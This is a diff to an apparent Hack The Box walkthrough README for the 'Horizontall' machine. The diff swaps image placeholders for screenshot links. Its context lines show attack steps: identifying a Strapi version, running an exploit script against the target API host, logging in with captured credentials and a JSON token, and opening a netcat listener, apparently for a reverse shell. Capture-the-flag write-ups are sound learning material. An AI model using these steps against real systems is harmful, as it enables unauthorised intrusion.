@@ -57,9 +57,7 @@ api-prod.horizontal.htb
 ```
 
 ###Found Some interesting directories, and also find a login page 
-```
-img 1
-```
+![login page](https://github.com/sigwotts/HTB-Walkthrough/blob/main/Horizontal/Main%20page.png)
 
 ##After some research we managed to find the version of strapi 
 ```
@@ -161,9 +159,8 @@ python3 exploit.py http://api-prod.horizontall.htb/
 
 ```
 ##By using these creds and JSON Token we managed to login through the portal (using burp) 
-```
-img
-```
+![Admin page](https://github.com/sigwotts/HTB-Walkthrough/blob/main/Horizontal/adminpage%20after%20login.png)
+
 ##Now we set up a netcat listner
 ```
 nc -lnvp 4444
